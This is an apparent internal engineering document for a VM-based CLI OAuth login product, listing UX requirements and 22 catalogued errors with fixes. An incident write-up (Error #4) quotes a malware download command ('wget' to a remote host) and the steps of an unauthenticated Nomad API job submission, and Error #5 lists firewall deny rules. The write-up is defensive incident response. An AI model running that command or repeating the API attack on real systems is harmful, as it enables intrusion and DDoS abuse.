# CORRECT UX Requirements & All Errors Encountered

**Created**: November 24, 2025
**Purpose**: Document the CORRECT user experience and catalog ALL errors we've faced

---

## CORRECT USER EXPERIENCE (What It Should Be)

### Current Page: http://localhost:3000/dashboard/remote-cli

### Phase 1: Provider Selection
```
┌─────────────────────────────────────────────────────┐
│  Remote CLI Dashboard                               │
│  ┌─────────────┐ ┌─────────────┐ ┌──────────────┐ │
│  │ Claude Code │ │ OpenAI      │ │ Google       │ │
│  │             │ │ Codex       │ │ Gemini       │ │
│  │  [Connect]  │ │  [Connect]  │ │  [Connect]   │ │
│  └─────────────┘ └─────────────┘ └──────────────┘ │
└─────────────────────────────────────────────────────┘
```

User clicks **"Connect Claude Code"** button

---

### Phase 2: VM Creation (Loading Screen)

```
┌─────────────────────────────────────────────────────┐
│  Creating Your Secure Environment                   │
│                                                      │
│  [●──────] Allocating VM resources (1 vCPU, 1.5GB) │
│  [●──────] Configuring secure network               │
│  [●──────] Starting VM and services                 │
│                                                      │
│  ⏱️ This usually takes 15-30 seconds               │
└─────────────────────────────────────────────────────┘
```

System creates Firecracker VM in background

---

### Phase 3: VM Desktop Display (THE CRITICAL PART)

**WHEN VM IS READY, USER SHOULD SEE:**

```
┌─────────────────────────────────────────────────────────────────────────┐
│  VM Desktop - Full HD 1920x1080                              [ Minimize ]│
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ┌───────────────────────────────────────────────────────────────────┐ │
│  │ Terminal (XFCE Terminal) - OPEN and MAXIMIZED          [_][□][X] │ │
│  ├───────────────────────────────────────────────────────────────────┤ │
│  │ root@vm-xxxx:~$ _                                                 │ │
│  │                                                                   │ │
│  │                                                                   │ │
│  │                                                                   │ │
│  │                                                                   │ │
│  │                                                                   │ │
│  └───────────────────────────────────────────────────────────────────┘ │
│                                                                          │
│  ┌───────────────────────────────────────────────────────────────────┐ │
│  │ Firefox Browser - OPEN (but behind terminal)           [_][□][X] │ │
│  ├───────────────────────────────────────────────────────────────────┤ │
│  │ ⬅️ ➡️ 🔄  🏠  (about:blank)                                       │ │
│  ├───────────────────────────────────────────────────────────────────┤ │
│  │                                                                   │ │
│  │                                                                   │ │
│  │                   (Blank page, ready for OAuth)                  │ │
│  │                                                                   │ │
│  │                                                                   │ │
│  └───────────────────────────────────────────────────────────────────┘ │
│                                                                          │
│  [XFCE Desktop Environment - Full 1920x1080 Resolution]                │
│  [Taskbar at bottom with: Terminal, Firefox, System icons]             │
└─────────────────────────────────────────────────────────────────────────┘
```

**CRITICAL REQUIREMENTS**:
- ✅ **Full 1920x1080 resolution** (not small window!)
- ✅ **Terminal window OPEN and in focus** (user can immediately type)
- ✅ **Firefox browser OPEN** (but behind terminal, ready for OAuth)
- ✅ **XFCE desktop environment** with proper taskbar
- ✅ **Both windows NOT minimized** - visible and ready

---

### Phase 4: User Types CLI Command

**INSTRUCTIONS SHOWN TO USER**:
```
┌─────────────────────────────────────────────────────┐
│  Authentication Steps                               │
│                                                      │
│  1️⃣ Access VM Desktop                               │
│     ✅ VM desktop is now visible above              │
│                                                      │
│  2️⃣ Run the authentication command                  │
│     In the terminal window above, type:             │
│                                                      │
│     For Claude Code:                                │
│     $ claude                                        │
│                                                      │
│     For OpenAI Codex:                               │
│     $ codex                                         │
│                                                      │
│     For Google Gemini:                              │
│     $ gemini                                        │
│                                                      │
│  3️⃣ Complete OAuth in the browser window            │
│     The CLI will automatically open the OAuth page  │
│     in the Firefox browser within the VM            │
│                                                      │
│  4️⃣ We'll detect completion automatically           │
│     Once authenticated, this page will advance      │
└─────────────────────────────────────────────────────┘
```

**WHAT USER DOES**:
1. User sees terminal in VM desktop
2. User types: `claude` (or `codex`, or `gemini`)
3. CLI tool starts and prints:
   ```
   Welcome to Claude Code!
   Please authenticate to continue...
   Opening browser for OAuth...
   ```
4. Firefox browser in VM automatically comes to front
5. Browser opens OAuth URL (e.g., `https://console.anthropic.com/oauth/authorize?...`)
6. User completes OAuth in the browser
7. CLI receives callback and saves credentials
8. OAuth agent detects completion
9. Frontend polls `/api/auth/session/:sessionId/credentials/status` and sees `ready: true`
10. Page shows "Successfully Connected!" and VM is destroyed

---

### Phase 5: Success

```
┌─────────────────────────────────────────────────────┐
│  ✅ Successfully Connected!                         │
│                                                      │
│  Your Claude Code CLI tool is now ready to use      │
│                                                      │
│  What's Next?                                        │
│  ✓ Your credentials are securely encrypted          │
│  ✓ Your VM will hibernate when idle                 │
│  ✓ You can start sending prompts immediately        │
│                                                      │
│  [Back to Dashboard]  [Start Chatting]              │
└─────────────────────────────────────────────────────┘
```

---

## CURRENT BROKEN STATE VS. CORRECT STATE

### WHAT WE HAVE NOW (BROKEN):

```
VNC Desktop Display:
┌─────────────────────────────────────┐
│                                      │
│  [Black screen]                      │
│                                      │
│                                      │
│                                      │
│                                      │
│                                      │
│  ┌──────┐                           │
│  │xterm │ ← Small window at bottom  │
│  │  $   │    left corner             │
│  └──────┘                            │
└─────────────────────────────────────┘
```

**Problems**:
- ❌ Not full 1920x1080 resolution
- ❌ Shows tiny xterm window instead of XFCE
- ❌ No browser window visible
- ❌ No XFCE desktop environment
- ❌ User cannot see where to type
- ❌ Black screen with orphan window

### WHAT WE SHOULD HAVE (CORRECT):

```
VNC Desktop Display:
┌─────────────────────────────────────────────────────────────────────┐
│ XFCE Desktop - Full 1920x1080                                        │
│                                                                       │
│  ┌─────────────────────────────────────────────────────────────────┐│
│  │ Terminal - XFCE Terminal                          [_][□][X]     ││
│  ├─────────────────────────────────────────────────────────────────┤│
│  │ root@vm-uuid:~$ _                                               ││
│  │                                                                  ││
│  │ (User can immediately type 'claude' here)                       ││
│  │                                                                  ││
│  │                                                                  ││
│  └─────────────────────────────────────────────────────────────────┘│
│                                                                       │
│  [Taskbar: Terminal | Firefox | System Menu | Clock]                │
└─────────────────────────────────────────────────────────────────────┘
```

**Requirements**:
- ✅ Full 1920x1080 resolution
- ✅ XFCE desktop environment with taskbar
- ✅ Terminal window OPEN, MAXIMIZED, and in FOCUS
- ✅ Firefox browser OPEN but behind terminal (ready for OAuth)
- ✅ User can immediately start typing
- ✅ Clear, usable desktop environment

---

## ALL ERRORS ENCOUNTERED (Comprehensive List)

### ERROR #1: VNC Display Shows Small Window Instead of Full Screen
**Severity**: 🔴 CRITICAL - BLOCKING PRODUCTION
**Status**: ❌ UNRESOLVED (Week 4)
**First Encountered**: ~November 17-18, 2025

**Symptom**:
- VNC connects successfully on port 5901
- noVNC displays connection
- Shows BLACK screen with tiny xterm window at bottom-left corner
- Expected: Full 1920x1080 XFCE desktop

**Root Cause**:
- Direct `Xtigervnc` execution bypasses `~/.vnc/xstartup` script
- Only `vncserver` wrapper executes xstartup
- `vncserver` command doesn't exist in golden rootfs
- XFCE desktop not starting properly

**Attempted Fixes** (all failed):
1. ❌ Separate xfce-desktop.service - XFCE doesn't authenticate to X server
2. ❌ Add XAUTHORITY environment - Still shows small window
3. ❌ Create ~/.vnc/xstartup script - Never executed
4. ❌ Change to vncserver wrapper - Command not found
5. ❌ Xtigervnc + ExecStartPost - Mount failed, not fully tested
6. ⏳ Switch to x11vnc + Xvfb - Currently attempting (from previous session)

**Impact**:
- User cannot see where to type commands
- Cannot interact with VM desktop properly
- OAuth flow cannot complete
- CORE FUNCTIONALITY BROKEN

**Files Involved**:
- `/var/lib/firecracker/snapshots/base/golden-browser-rootfs.ext4` (inside: `/etc/systemd/system/tigervnc.service`)
- `/root/.vnc/xstartup` (not executed)

**Documentation**: `/Users/venkat/Documents/polydev-ai/VNC_DISPLAY_ISSUE_COMPLETE_ANALYSIS.md`

---

### ERROR #2: Terminal Window Not Auto-Opening
**Severity**: 🔴 CRITICAL - BLOCKING UX
**Status**: ❌ NOT IMPLEMENTED
**Related to**: Error #1 (VNC display issue)

**Symptom**:
- Even if VNC works, no terminal window automatically opens
- User sees XFCE desktop with no windows
- User doesn't know what to do

**Required**:
- Terminal window should auto-open on boot
- Should be MAXIMIZED and in FOCUS
- Should show bash prompt ready for input
- Command to type should be displayed in instructions

**Solution Needed**:
```bash
# In golden rootfs, create autostart script:
mkdir -p /root/.config/autostart

cat > /root/.config/autostart/terminal.desktop <<'EOF'
[Desktop Entry]
Type=Application
Name=Terminal
Exec=xfce4-terminal --maximize --title="Polydev CLI Authentication"
Terminal=false
StartupNotify=false
EOF
```

**Current Status**: Not implemented yet

---

### ERROR #3: Firefox Browser Not Auto-Opening
**Severity**: 🟠 HIGH - IMPACTS UX
**Status**: ❌ NOT IMPLEMENTED

**Symptom**:
- No browser window automatically opens
- When CLI opens OAuth URL, nothing happens
- User doesn't see OAuth page

**Required**:
- Firefox should auto-open on boot (but behind terminal)
- Should be ready to display OAuth pages
- Should automatically come to foreground when CLI opens URL

**Solution Needed**:
```bash
# In golden rootfs, create autostart script:
cat > /root/.config/autostart/firefox.desktop <<'EOF'
[Desktop Entry]
Type=Application
Name=Firefox
Exec=firefox --new-instance
Terminal=false
StartupNotify=false
EOF

# Configure CLI tools to use Firefox for OAuth
export BROWSER=firefox
```

**Current Status**: Not implemented yet

---

### ERROR #4: DDoS Attack from Nomad API Exposure
**Severity**: 🔴 CRITICAL - SECURITY INCIDENT
**Status**: ✅ RESOLVED (November 24, 2025)
**Date**: November 23, 2025 23:54-23:55 UTC

**Symptom**:
- VPS launched UDP flood DDoS attack against 45.8.173.1:10
- Hetzner locked VPS 135.181.138.102
- Malicious process running: `wget http://91.92.242.138/hcl.sh`
- Process owner: `nobody` (UID 65534)
- Parent process: Nomad (PID 1615563)

**Root Cause**:
```hcl
# /etc/nomad.d/nomad.hcl
bind_addr = "0.0.0.0"    # ❌ Listening on ALL interfaces (public internet)

acl {
  enabled = false         # ❌ NO AUTHENTICATION REQUIRED
}
```

**Attack Vector**:
1. Attackers scanned for publicly exposed Nomad APIs
2. Found VPS with port 4646 open (HTTP API)
3. Submitted malicious job via `POST http://135.181.138.102:4646/v1/jobs`
4. Nomad executed job as `nobody` user without authentication
5. Job downloaded malware: `wget http://91.92.242.138/hcl.sh`
6. Malware launched UDP flood DDoS attack

**Evidence**:
```bash
$ netstat -tulpn | grep -E '(4646|4647|4648)'
tcp6  :::4646  :::*  LISTEN  1621170/nomad
tcp6  :::4647  :::*  LISTEN  1621170/nomad
tcp6  :::4648  :::*  LISTEN  1621170/nomad
udp6  :::4648  :::*         1621170/nomad

$ nomad job status
ID          Type   Status
XxBkTbcskA  batch  pending  ← Malicious job
```

**Fix Applied**:
- ✅ Stopped and disabled Nomad service
- ✅ Killed all Nomad processes
- ✅ Added UFW firewall rules (deny 4646-4648)
- ✅ Verified system clean (no malware)
- ✅ Created automated security monitoring (hourly)

**Documentation**: `/Users/venkat/Documents/polydev-ai/HETZNER_UNLOCK_REQUEST.md`

---

### ERROR #5: UFW Firewall Completely Disabled
**Severity**: 🔴 CRITICAL - SECURITY VULNERABILITY
**Status**: ✅ RESOLVED (November 24, 2025)
**Discovered During**: Security hardening after DDoS attack

**Symptom**:
```bash
$ ufw status
Status: inactive
```

System had NO firewall protection despite having rules configured!

**Impact**:
- All ports were exposed to the internet
- Nomad API accessible without firewall blocking
- No protection against port scanning
- Critical security vulnerability

**Fix Applied**:
```bash
# Reset and reconfigure UFW
ufw --force reset
ufw default deny incoming
ufw default allow outgoing

# Allow essential services
ufw allow 22/tcp comment 'SSH access'
ufw allow 80/tcp comment 'HTTP (Nginx)'
ufw allow 443/tcp comment 'HTTPS (Nginx)'

# Deny attack vectors
ufw deny 4646/tcp comment 'Nomad HTTP API - BLOCKED'
ufw deny 4647/tcp comment 'Nomad RPC - BLOCKED'
ufw deny 4648/tcp comment 'Nomad Serf - BLOCKED'
ufw deny 4648/udp comment 'Nomad Serf UDP - BLOCKED'
ufw deny 9090/tcp comment 'Prometheus - BLOCKED'
ufw deny 9100/tcp comment 'Node Exporter - BLOCKED'

# Enable firewall
ufw --force enable
```

**Prevention**:
- Updated `security-monitor.sh` to check UFW status
- Auto-enables UFW if disabled
- Hourly monitoring via cron

**Current Status**: ✅ UFW active and monitored

---

### ERROR #6: WebRTC Offer/Answer Race Condition
**Severity**: 🟠 HIGH - CONNECTION FAILURES
**Status**: ✅ PARTIALLY FIXED (November 2025)

**Symptom**:
- Browser creates WebRTC offer AFTER calling `/api/auth/start`
- VM boots and immediately polls `GET /api/webrtc/session/:sessionId/offer`
- Offer doesn't exist yet when VM polls
- Results in connection timeout and failures

**Timing Diagram** (BROKEN):
```
Time  Browser                    Master Controller         VM
0s    Click "Connect"
1s    POST /api/auth/start →
2s                              Create session
3s                              Start VM creation
4s                              VM booting...
...
15s                             VM boots
16s                                                    ← Polls for offer
17s                                                    ← No offer! Wait...
18s   (Now creating offer...)
19s   POST /api/webrtc/offer →
20s                             Store offer
21s                                                    ← Finally gets offer
```

**Fix Applied**:
```typescript
// /src/app/dashboard/remote-cli/page.tsx:124-214

const handleConnectProvider = async (providerId: string) => {
  // CRITICAL FIX: Create offer BEFORE calling /api/auth/start

  // 1. Fetch ICE servers
  const iceServersResponse = await fetch('/api/webrtc/ice-servers');
  const { iceServers } = await iceServersResponse.json();

  // 2. Create RTCPeerConnection
  const pc = new RTCPeerConnection({ iceServers });

  // 3. Create offer
  const offer = await pc.createOffer({
    offerToReceiveVideo: true,
    offerToReceiveAudio: false
  });
  await pc.setLocalDescription(offer);

  // 4. Collect ICE candidates (up to 2s)
  const candidates: RTCIceCandidate[] = [];
  await new Promise<void>((resolve) => {
    const timeout = setTimeout(resolve, 2000);
    pc.onicecandidate = (event) => {
      if (event.candidate) {
        candidates.push(event.candidate);
      } else {
        clearTimeout(timeout);
        resolve();
      }
    };
  });

  // 5. THEN start auth with offer included
  const res = await fetch('/api/vm/auth', {
    method: 'POST',
    body: JSON.stringify({
      provider: providerId,
      webrtcOffer: {
        offer: pc.localDescription,
        candidates: candidates.map(c => ({
          candidate: c.candidate,
          sdpMLineIndex: c.sdpMLineIndex
        }))
      }
    })
  });

  // Offer is now stored BEFORE VM boots!
};
```

**New Timing** (FIXED):
```
Time  Browser                    Master Controller         VM
0s    Click "Connect"
1s    Create WebRTC offer
2s    Collect ICE candidates
3s    POST /api/auth/start →
      (with offer included)
4s                              Store offer FIRST
5s                              Create session
6s                              Start VM creation
...
20s                             VM boots
21s                                                    ← Polls for offer
22s                                                    ← Offer exists! ✅
```

**Remaining Issues**:
- Signaling service uses in-memory storage (lost on restart)
- WebRTC server in VM still has GStreamer pipeline issues

**Files Modified**:
- `/src/app/dashboard/remote-cli/page.tsx:124-214`
- `/master-controller/src/routes/auth.js` (stores offer before VM creation)

---

### ERROR #7: VM Health Check Timeouts (EHOSTUNREACH)
**Severity**: 🟠 HIGH - FREQUENT FAILURES
**Status**: ⚠️ MITIGATED BUT STILL OCCURRING

**Symptom**:
```
[WAIT-VM-READY] Checking VM health: http://192.168.100.3:8080/health
[WAIT-VM-READY] Health check failed: EHOSTUNREACH
[WAIT-VM-READY] Health check failed: EHOSTUNREACH
[WAIT-VM-READY] Health check failed: EHOSTUNREACH
...
[WAIT-VM-READY] Max retries exhausted - VM not ready after 180000ms
```

**Root Cause**:
- VM takes 45-60s to fully boot OAuth agent
- VNC takes extra 15s for RFB protocol initialization
- Network may have brief delays during boot
- Health checks were timing out too early

**Attempted Fixes**:
1. ✅ Increased initial delay to 45s
2. ✅ Increased total timeout to 3 minutes (180s)
3. ✅ Added extra 15s delay after VNC port opens
4. ✅ Added retry logic for EHOSTUNREACH/ETIMEDOUT (up to 10 retries, 2s delays)

**Configuration**:
```javascript
// /master-controller/src/config/index.js
performance: {
  browserVmHealthTimeoutMs: 180000, // 3 minutes
  cliOAuthStartTimeoutMs: 10000
}

// /master-controller/src/services/browser-vm-auth.js
async waitForVMReady(vmIP, maxWaitMs = 180000) {
  const initialDelayMs = 45000; // 45s for OAuth agent

  await new Promise(resolve => setTimeout(resolve, initialDelayMs));

  while (Date.now() - startTime < maxWaitMs) {
    // Check OAuth agent health on port 8080
    // Check VNC port 5901
    // Extra 15s delay for VNC RFB initialization
  }
}
```

**Remaining Issues**:
- Still seeing EHOSTUNREACH despite retries
- No visibility into WHY VMs sometimes never become ready
- Hardcoded delays are brittle (different VMs boot at different speeds)

**Better Solution Needed**:
- Implement proper readiness checks (not just delays)
- Add health check endpoint to OAuth agent with dependencies
- Log VM boot console output for debugging
- Consider using systemd-notify for service readiness

---

### ERROR #8: Stale Sessions Persisting in Database
**Severity**: 🟠 HIGH - UX DEGRADATION
**Status**: ⚠️ ONGOING

**Symptom**:
- User clicks "Connect Claude Code"
- Frontend loads old session from database instead of creating new one
- Old session points to destroyed VM (IP no longer exists)
- Connection fails with EHOSTUNREACH
- User forced to manually cleanup or wait

**Evidence from Code**:
```typescript
// /src/app/dashboard/remote-cli/page.tsx:90-102
const loadVMStatus = async () => {
  const res = await fetch('/api/vm/status');
  if (res.ok) {
    const data = await res.json();
    setVmStatus(data.vm);  // ← Loads old VM info
  }
};

// Called every 10 seconds!
useEffect(() => {
  loadVMStatus();
  loadOAuthStatus();
  const interval = setInterval(() => {
    loadVMStatus();
    loadOAuthStatus();
  }, 10000);
}, []);
```

**Root Cause**:
- No session expiration/cleanup logic
- Frontend doesn't check if VM is actually alive
- Database keeps old sessions indefinitely
- No TTL on sessions

**Impact**:
- User clicks "Connect" → sees error
- Has to manually delete session or wait for timeout
- Poor UX - not seamless like Replit

**Solution Needed**:
1. Add session expiration (e.g., 24 hours)
2. Check VM is actually alive before showing it
3. Auto-cleanup on page load (delete sessions where VM doesn't exist)
4. Add "Refresh" button to force new session

---

### ERROR #9: No Terminal/Browser Windows Auto-Opening in VM
**Severity**: 🔴 CRITICAL - UX BLOCKING
**Status**: ❌ NOT IMPLEMENTED

**Symptom**:
- User sees XFCE desktop (when VNC works)
- But no windows are open
- User doesn't know what to do
- Has to manually open terminal

**Required Behavior**:
1. VM boots → XFCE desktop loads
2. **Terminal window auto-opens**, MAXIMIZED, in FOCUS
3. **Firefox browser auto-opens**, but behind terminal (not minimized)
4. User can immediately start typing

**Solution Needed**:
```bash
# Create XFCE autostart entries in golden rootfs

# 1. Auto-open terminal (in focus)
cat > /root/.config/autostart/01-terminal.desktop <<'EOF'
[Desktop Entry]
Type=Application
Name=Terminal
Exec=xfce4-terminal --maximize --title="Type CLI command here (claude, codex, or gemini)"
Terminal=false
StartupNotify=false
X-XFCE-Autostart-Override=true
EOF

# 2. Auto-open Firefox (behind terminal)
cat > /root/.config/autostart/02-firefox.desktop <<'EOF'
[Desktop Entry]
Type=Application
Name=Firefox
Exec=sh -c "sleep 2 && firefox --new-instance"
Terminal=false
StartupNotify=false
X-XFCE-Autostart-Override=true
EOF
```

**Current Status**: Not implemented - this is why UX is broken!

---

### ERROR #10: Instructions Don't Show CLI Command to Type
**Severity**: 🟠 HIGH - UX CONFUSION
**Status**: ❌ INCOMPLETE

**Symptom**:
- Frontend shows: "Run the authentication command in the terminal"
- But doesn't tell user WHAT command to type!
- User has to guess

**Current Code** (auth/page.tsx:696-698):
```typescript
<p className="font-medium mb-1">Run the authentication command in the terminal</p>
<p className="text-sm text-muted-foreground mb-2">
  The CLI tool is already running. Complete the OAuth flow in the terminal above.
</p>
```

**This is WRONG!** - CLI tool is NOT already running

**Correct Instructions**:
```typescript
<p className="font-medium mb-1">Run the authentication command in the terminal</p>
<p className="text-sm text-muted-foreground mb-2">
  In the terminal window above, type the following command and press Enter:
</p>
<div className="p-3 bg-muted rounded-lg font-mono text-sm">
  {provider === 'claude_code' && '$ claude'}
  {provider === 'codex' && '$ codex'}
  {provider === 'gemini_cli' && '$ gemini'}
</div>
<p className="text-xs text-muted-foreground mt-2">
  The CLI will automatically open the OAuth page in the Firefox browser inside the VM.
  Complete the authentication there.
</p>
```

**Fix Required**: Update auth/page.tsx with correct instructions

---

### ERROR #11: VNC WebSocket Connection Failures
**Severity**: 🟠 HIGH - INTERMITTENT FAILURES
**Status**: ⚠️ PARTIALLY MITIGATED

**Symptom**:
```
noVNC: WebSocket connection failed
Error: EHOSTUNREACH
Error: ETIMEDOUT
Error: ECONNREFUSED
```

**Root Causes**:
1. VNC server not ready when noVNC tries to connect
2. Network race conditions during VM boot
3. No retry logic in WebSocket proxy

**Fix Applied**:
```javascript
// /master-controller/src/services/vnc-websocket-proxy.js
async connectToVNCWithRetry(ws, vmIP, connectionId, attempt) {
  const MAX_RETRIES = 10;
  const RETRY_DELAY_MS = 2000;

  vncSocket.on('error', (err) => {
    const isRetryable = err.code === 'EHOSTUNREACH' ||
                        err.code === 'ETIMEDOUT' ||
                        err.code === 'ECONNREFUSED';

    if (isRetryable && attempt < MAX_RETRIES) {
      // Retry after 2s delay
      setTimeout(() => {
        this.connectToVNCWithRetry(ws, vmIP, connectionId, attempt + 1);
      }, RETRY_DELAY_MS);
    } else {
      ws.close(1011, `VNC connection error: ${err.message}`);
    }
  });
}
```

**Also Fixed in Frontend** (auth/page.tsx:613):
```typescript
<iframe
  src={`http://135.181.138.102:4000/novnc/vnc.html?autoconnect=1&reconnect=true&reconnect_delay=3000`}
  // ↑ reconnect=true enables automatic reconnection
/>
```

**Remaining Issues**:
- Still seeing some connection failures
- noVNC might give up before our retry logic completes
- Need better coordination between frontend and backend retries

---

### ERROR #12: Missing vncserver Command in Golden Rootfs
**Severity**: 🟠 HIGH - PREVENTS PROPER VNC SETUP
**Status**: ❌ UNRESOLVED

**Symptom**:
```bash
# Inside golden rootfs
$ which vncserver
# No output - command not found

# Trying to use vncserver in systemd service:
ExecStart=/usr/bin/vncserver :1 -geometry 1920x1080...
# Result: Failed to start service - command not found
```

**Root Cause**:
- TigerVNC package installed, but only Xtigervnc binary exists
- `vncserver` is a Perl wrapper script that should come with TigerVNC
- Package may be incomplete or wrong package installed

**Impact**:
- Cannot use `vncserver` wrapper (which executes ~/.vnc/xstartup)
- Forced to use direct `Xtigervnc` which bypasses xstartup
- This causes VNC display issue (no XFCE)

**Solution**:
```bash
# Mount golden rootfs
mount -o loop /var/lib/firecracker/snapshots/base/golden-browser-rootfs.ext4 /mnt/golden

# Chroot and install proper TigerVNC
chroot /mnt/golden /bin/bash
apt-get update
apt-get install --reinstall tigervnc-standalone-server
# or
apt-get install tigervnc-scraping-server  # Alternative package

# Verify vncserver exists
which vncserver
ls -l /usr/bin/vncserver

# If still missing, install from source or find correct package
```

**Current Status**: Blocker for proper VNC configuration

---

### ERROR #13: XFCE Not Starting Properly
**Severity**: 🟠 HIGH - DISPLAY ISSUE
**Status**: ❌ UNRESOLVED

**Symptom**:
- VNC connects but shows black screen
- Small xterm window visible at bottom-left
- XFCE desktop environment not loading
- No taskbar, no desktop icons

**Root Cause (Multiple Factors)**:
1. xstartup script not being executed (vncserver wrapper missing)
2. XFCE dependencies might be missing
3. DISPLAY environment variable issues
4. XAUTHORITY authentication issues
5. dbus/systemd session issues

**Dependencies Required**:
```bash
apt-get install -y \
  xfce4 \
  xfce4-terminal \
  xfce4-goodies \
  xfce4-power-manager \
  xfce4-screensaver \
  thunar \
  dbus-x11 \
  at-spi2-core \
  libcanberra-gtk3-module
```

**Proper Startup Sequence**:
```bash
# 1. Start D-Bus session
eval $(dbus-launch --sh-syntax)

# 2. Start XFCE session
startxfce4
```

**Current Status**: Not working - black screen with orphan xterm

---

### ERROR #14: VNC Proxy Routing Issues (Historical)
**Severity**: 🟠 HIGH - CONNECTION FAILURES
**Status**: ✅ RESOLVED (Switched to built-in Node.js proxy)

**Original Problem**:
- Used Python websockify with TokenFile plugin
- websockify kept crashing
- Manual coordination required between websockify and VM IPs
- Not production-stable

**Fix Applied**:
- Built custom VNC WebSocket proxy in Node.js
- Integrated into master controller
- Dynamic routing based on URL path
- No external dependencies

**Current Implementation**:
```javascript
// /master-controller/src/index.js
server.on('upgrade', async (req, socket, head) => {
  // Check if this is a VNC proxy request (/vnc/VM_IP)
  const vncMatch = req.url.match(/^\/vnc\/(\d+\.\d+\.\d+\.\d+)/);

  if (vncMatch) {
    const vmIP = vncMatch[1];
    global.vncProxy.handleUpgrade(req, socket, head, vmIP);
    return;
  }
});
```

**Status**: ✅ Working reliably now

---

### ERROR #15: Console Logs Deleted on VM Cleanup
**Severity**: 🟡 MEDIUM - DEBUGGING DIFFICULTY
**Status**: ⏳ FIX IMPLEMENTED BUT NOT TESTED

**Symptom**:
- VM fails to boot or connect
- VM gets destroyed
- Console logs are deleted
- Cannot debug what went wrong

**Impact**:
- Blind debugging - no visibility into VM boot process
- Cannot see systemd errors
- Cannot see network configuration issues
- Wastes time on repeat failures

**Fix Implemented**:
```javascript
// /master-controller/src/services/vm-manager.js
async destroyVM(vmId, preserveLogs = false) {
  if (preserveLogs) {
    const timestamp = new Date().toISOString().replace(/:/g, '-');
    const debugDir = '/var/log/vm-debug-logs';
    await fs.mkdir(debugDir, { recursive: true });

    // Preserve console.log
    await fs.copyFile(
      `${vmDir}/console.log`,
      `${debugDir}/${vmId}-${timestamp}-console.log`
    );

    // Preserve other logs if they exist
    // firecracker-error.log, etc.
  }

  // Then proceed with cleanup
}
```

**Status**: Code written but not yet tested with actual failures

---

### ERROR #16: No Clear Error Messages to User
**Severity**: 🟡 MEDIUM - UX ISSUE
**Status**: ❌ NOT IMPLEMENTED

**Symptom**:
- User clicks "Connect"
- Sees generic "Authentication Failed" with no details
- Doesn't know what went wrong or how to fix it

**Examples of Bad Error Messages**:
```
❌ "Authentication Failed" (what failed?)
❌ "VM not ready" (why not?)
❌ "Connection error" (what kind?)
```

**Required**:
```
✅ "VM failed to boot: XFCE desktop didn't start. Retrying..."
✅ "VNC connection failed: Port 5901 not reachable. VM may still be booting (30s elapsed)..."
✅ "OAuth agent not responding: Service may not have started. Check VM console logs."
```

**Solution Needed**:
- Parse error types and show user-friendly messages
- Show progress indicators during long waits
- Provide actionable retry options
- Log technical details but show simplified messages to user

**Files to Update**:
- `/src/app/dashboard/remote-cli/auth/page.tsx` (error display)
- `/master-controller/src/routes/auth.js` (return structured errors)

---

### ERROR #17: Hardcoded VPS IP in Frontend
**Severity**: 🟡 MEDIUM - SCALABILITY ISSUE
**Status**: ⚠️ EXISTS IN CODE

**Problem**:
```typescript
// /src/app/dashboard/remote-cli/auth/page.tsx:613
<iframe
  src={`http://135.181.138.102:4000/novnc/vnc.html?host=135.181.138.102&port=4000...`}
  //         ^^^^^^^^^^^^^^^^^^^^ Hardcoded!
/>
```

**Impact**:
- Cannot scale to multiple VPS hosts
- Cannot use in development (localhost)
- Breaks if VPS IP changes

**Solution**:
```typescript
// Use environment variable or derive from window.location
const masterControllerUrl = process.env.NEXT_PUBLIC_MASTER_CONTROLLER_URL ||
                            'http://135.181.138.102:4000';

<iframe
  src={`${masterControllerUrl}/novnc/vnc.html?host=${new URL(masterControllerUrl).hostname}...`}
/>
```

**Files to Fix**:
- `/src/app/dashboard/remote-cli/auth/page.tsx:613`
- All other hardcoded references to VPS IP

---

### ERROR #18: OAuth Agent Not Handling CLI OAuth Flow
**Severity**: 🟠 HIGH - CORE FUNCTIONALITY
**Status**: ⏳ UNCLEAR IF IMPLEMENTED

**Required Behavior**:
1. User types `claude` in VM terminal
2. Claude Code CLI starts OAuth server on `localhost:1455`
3. CLI prints: "Visit https://console.anthropic.com/oauth/authorize?..."
4. **OAuth agent should detect** this URL
5. **OAuth agent should forward** URL to master controller
6. **Master controller returns** URL to frontend
7. **Frontend can show** OAuth URL as fallback
8. **OR OAuth agent opens** Firefox automatically with URL

**Current Uncertainty**:
- Is this flow implemented in OAuth agent?
- Does OAuth agent detect localhost:1455?
- Does it forward the URL?
- Does it open Firefox automatically?

**Need to Verify**:
- Check `/opt/vm-browser-agent/` code
- Check if OAuth agent monitors for localhost ports
- Check if it can open Firefox with URL

**Documentation Gap**: Need to document OAuth agent's actual capabilities

---

### ERROR #19: Network Interface Naming Issues (Historical)
**Severity**: 🟢 LOW - RESOLVED
**Status**: ✅ FIXED

**Original Problem**:
- VM expected `eth0` interface
- Got `enp0s1` or similar (predictable naming)
- Network didn't come up

**Fix Applied**:
```javascript
// Added to kernel boot args:
'net.ifnames=0 biosdevname=0'
// Forces traditional eth0 naming
```

**Status**: ✅ Working reliably now

---

### ERROR #20: Golden Rootfs Clone Timeout
**Severity**: 🟡 MEDIUM - SLOW VM CREATION
**Status**: ⏳ MITIGATED

**Symptom**:
```
[VM-CREATE] Cloning golden rootfs...
[VM-CREATE] Error: cp command timed out after 15000ms
```

**Root Cause**:
- Golden rootfs is 6.8GB
- Copy operation takes 30-60s on some systems
- Timeout was too short (15s)

**Fix Applied**:
```javascript
// /master-controller/src/services/vm-manager.js
// Increased timeout from 15s to 90s
await execWithTimeout(`cp ${goldenRootfs} ${vmRootfs}`, 90000);
```

**Better Solution**:
- Use CoW (copy-on-write) with devicemapper
- Or use Firecracker snapshots properly
- Avoid full copy every time

**Current Status**: Mitigated with longer timeout

---

### ERROR #21: No OAuth Flow Validation
**Severity**: 🟡 MEDIUM - RELIABILITY
**Status**: ❌ NOT IMPLEMENTED

**Problem**:
- System assumes OAuth will succeed
- No detection of OAuth failures
- No retry mechanism
- No timeout handling

**What Could Go Wrong**:
1. User closes browser without completing OAuth
2. OAuth fails (wrong credentials, 2FA, etc.)
3. Network timeout during OAuth
4. CLI crashes during OAuth

**Required**:
- Timeout for OAuth completion (e.g., 10 minutes)
- Detect if user closed browser
- Allow retry without recreating VM
- Show clear error messages

**Current Status**: No validation exists

---

### ERROR #22: No Rate Limiting or Abuse Prevention
**Severity**: 🟡 MEDIUM - SECURITY/COST
**Status**: ❌ NOT IMPLEMENTED

**Problem**:
- User can create unlimited VMs
- No rate limiting on API endpoints
- Could be abused for resource exhaustion
- High cost if user creates 100s of VMs

**Required**:
- Limit VM creation to X per user per hour
- Limit concurrent VMs per user (1-2)
- Detect and block rapid creation attempts
